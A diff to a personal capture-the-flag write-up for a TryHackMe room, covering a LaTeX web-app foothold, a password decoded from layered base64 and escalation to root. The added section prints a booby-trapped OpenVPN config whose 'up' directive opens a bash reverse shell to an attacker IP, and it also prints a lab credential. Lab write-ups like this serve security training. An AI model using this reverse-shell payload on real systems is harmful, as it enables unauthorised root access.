@@ -2,7 +2,13 @@
 
 "Try Harder!"
 
-This one was tough, but fun. I learnt a lot more than I would like about latex.
+This one was tough, but fun. I learnt a lot more than I would like about latex. 
+
+While the first stage - getting a shell on the box, was very exploratory and fun, the second stage got a weee bit CTF-like, with props like secret values encoded using keys buried in unrealistic APKs and an exploitable connection to TryHackMe etc. 
+
+Ah well, learned a bit, and all the time wasted enumerating certainly taught me a lot about enumerating :D However, I would hope OSCP is a little more real-world than this.
+
+## Process
 
 First, only 22 and 80 are open. 80 reveals a 'TexMaker' website, where you can enter LaTeX script and have it compiled into a PDF for you.
 
@@ -79,3 +85,20 @@ But, one thing I noticed, was that the supposed base64 started with `=`; normall
 A bit of experimenting revealed the solution: reverse -> from base64 * 16 (yes, decode from base64 16 times) which finally gave: 
 
     king:tryh@ckm3w4sH3r3
+
+After this, ssh'ing onto the box as King, even moar enumeration. The PATH variable looked suspicious, along with root's cronjob that ran `bash run.sh`. I tried replacing bash via exploiting the fact that PATH appeared to include king's home directory subfolders, but that didn't work.
+
+More help pointed me to a suspicious file in /home that I had previous ignored as some sort of weird artefact: one thing about this room is that its a bit CTF-ey, not real worldey, if that makes sense. Basically there is an tryhackme.ovpn file in the home dir, and its being run by run on a shedule, likely as part of the `run.sh` the cronjob is invoking.
+
+Well, there is an exploit via ovpn files: https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da
+
+I replaced the ovpn's content with:
+
+    remote 3.104.196.208:1194
+    dev null
+    script-security 2
+    up "/bin/bash -c '/bin/bash -i > /dev/tcp/10.10.162.148/4444 0<&1 2>&1&'"
+
+With the first IP Port above being the IP Port I use when connecting to TryHackMe (just there to make the connection valid), and the second IP Port being my attacker machine, where I set up a nc listener.
+
+A root shell popped momentarily. A bit silly, really.
